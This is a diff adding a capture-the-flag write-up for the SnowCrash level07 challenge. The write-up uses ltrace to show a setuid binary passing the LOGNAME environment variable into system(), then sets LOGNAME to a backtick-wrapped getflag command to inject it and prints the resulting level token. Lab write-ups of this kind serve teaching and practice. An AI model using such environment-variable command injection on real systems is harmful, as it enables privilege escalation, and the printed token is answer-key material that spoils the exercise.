@@ -1,0 +1,26 @@
+1/ LTRACE ANALYSIS ON THE BINARY LEVEL07
+============================================
+level07@SnowCrash:~$ ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                                                = 2007
+geteuid()                                                                                                = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                      = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                      = 0
+getenv("LOGNAME")                                                                                        = "level07"
+asprintf(0xbffff634, 0x8048688, 0xbfffff3f, 0xb7e5ee55, 0xb7fed280)                                      = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                   = 0
++++ exited (status 0) +++
+
+
+2/ The vulnerability is on the getenv("LOGNAME")
+level07@SnowCrash:~$ export LOGNAME='`getflag`'
+(not only backticks: export LOGNAME=`getflag`, otherwise export not working and bash wants to execute command directly while exporting variable and put answer inside LOGNAME (
+export LOGNAME=`getflag`
+level07@SnowCrash:~$ echo $LOGNAME
+Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
+)) -> important: “ ` “ otherwise not working - Text between backticks (`xy`) is executed and replaced by the output of the command
+./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
